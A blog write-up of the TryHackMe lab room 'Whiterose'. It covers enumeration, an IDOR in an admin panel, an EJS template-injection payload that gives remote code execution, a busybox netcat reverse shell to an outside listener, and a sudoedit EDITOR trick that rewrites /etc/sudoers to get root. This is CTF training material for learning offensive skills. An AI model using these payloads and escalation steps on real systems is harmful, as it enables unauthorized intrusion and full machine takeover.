---
layout: ../../../../layouts/Post.astro
title: Whiterose THM Writeup
description: This is a writeup of Whiterose, a TryHackMe room.
publishDate: Tuesday, February 25 2025
author: "s1lentMT"
image: "/assets/blog/whiterose/whiterose-thm.png"
alt: Image of TryHackMe's Whiterose room.
tags: ["Writeup"]
---

At the beginning, we are informed that the user **Olivia Cortez** with the password **olivi8** will be useful throughout the machine.

After an nmap scan, we can determine that ports **80** and **22** are open, meaning the **SSH** and **Nginx** services are active.

```shell
nmap -sC -sV -O --osscan-guess 10.10.170.109

Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-22 19:32 GMT
Nmap scan report for cyprusbank.thm (10.10.170.109)
Host is up (0.00035s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 02:12:8D:60:9B:2F (Unknown)
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.8 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 
210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), 
Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ )
```

The versions of these services are **OpenSSH 7.6p1 Ubuntu 4ubuntu0.7** and **nginx/1.14.0** respectively.

The operating system of the machine is **Linux**.

When accessing the web, we will see a maintenance message.

![Image of the web](/assets/blog/whiterose/img-1.png)

## Enumeration

### Directories

```shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://cyprusbank.thm/FUZZ -ic
```

With this search, nothing was found, so I proceed to enumerate VHOSTS.

```shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://cyprusbank.thm -H 'Host: FUZZ.cyprusbank.thm' -ic -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://cyprusbank.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cyprusbank.thm
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 57
 :: Filter           : Response words: 1
 :: Filter           : Response lines: 4
________________________________________________

www                     [Status: 200, Size: 252, Words: 19, Lines: 9]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1]
WWW                     [Status: 200, Size: 252, Words: 19, Lines: 9]
:: Progress: [4997/4997] :: Job [1/1] :: 13044 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

As we can see, **admin** stands out, so we will edit the **/etc/hosts** file to access it.

Once we access, there is an administration panel.

![Image of the administration panel](/assets/blog/whiterose/img-2.png)

If we try to use the credentials provided earlier in the room, we will gain access to the panel.

![Image of the inside of the administration panel](/assets/blog/whiterose/img-3.png)

The data we see in the panel is censored, so we won't be able to see Tyrell's phone number.

If we access the messages section, we will see a URL with an interesting parameter. If we change it, we can perform an **IDOR** and obtain the credentials of an administrator account.

With this, we can now obtain Tyrell's phone number.

If we access the settings section and intercept the request, we can play with the parameters and see that we can cause a **500 error** that will show an interesting trace:

```log
ReferenceError: /home/web/app/views/settings.ejs:14
    12|         <div class="alert alert-info mb-3"><%= message %></div>
    13|       <% } %>
 >> 14|       <% if (password != -1) { %>
    15|         <div class="alert alert-success mb-3">Password updated to '<%= password %>'</div>
    16|       <% } %>
    17|       <% if (typeof error != 'undefined') { %>

password is not defined
    at eval ("/home/web/app/views/settings.ejs":27:8)
    at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)
    at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)
    at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)
    at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)
    at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)
    at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)
    at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)
    at /home/web/app/routes/settings.js:27:7
    at processTicksAndRejections (node:internal/process/task_queues:96:5)
```

The **settings.ejs** file stands out. If we search for any type of exploit related to this, we can compromise the machine.

And luckily, there is a **CVE** that allows us to execute commands (RCE) on the machine.

With this payload, we can execute the command **"whoami"**:

```http
name=test&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('whoami');&password=test
```

Since we can execute this type of commands, we could obtain a reverse shell, which would allow us to execute commands directly on the machine without needing to interact through requests.

With the following payload, we can receive the connection on our listener:

```shell
nc -lvnp 4444
name=test&password=&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.10.150.123 4444 -e sh');s
```

Later, we will see that a connection is received in our netcat, and we can spawn a shell with Python or other methods:

```shell
root@ip-10-10-150-123:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.0 38318
python3 -c 'import pty; pty.spawn("/bin/bash")'
web@cyprusbank:~/app$ 

web@cyprusbank:~/app$ id
id
uid=1001(web) gid=1001(web) groups=1001(web)
```

If we continue investigating within the directories of our server, we will find the **user.txt** flag:

```shell
web@cyprusbank:~/app$ cd ..
cd ..
web@cyprusbank:~$ ls
ls
app  user.txt
web@cyprusbank:~$ cat user.txt
cat user.txt
THM{XXXXXXXXXXXXX}
web@cyprusbank:~$
```

To see which commands our user can execute, we will run **sudo -l** and see that we have permissions to execute **sudoedit**:

```shell
web@cyprusbank:~/app$ sudo -l     
sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

From here, we need to see how to exploit the machine and take advantage of this.

We see that there is an exploit we can perform that would allow us to gain root privileges:

```shell
export EDITOR="vim -- /etc/sudoers"
```

This will allow us to open **vim** with the **/etc/sudoers** file when we open the **/etc/nginx/sites-available/admin.cyprusbank.thm** file.

```shell
web ALL=(ALL:ALL) ALL
```

And now we can run **sudo su** without needing a password :).

Now, we just need to find the **root.txt** file, view its contents, and we have completed the room.

This flag will be found in **/root**, and with a **cat**, we will have our flag.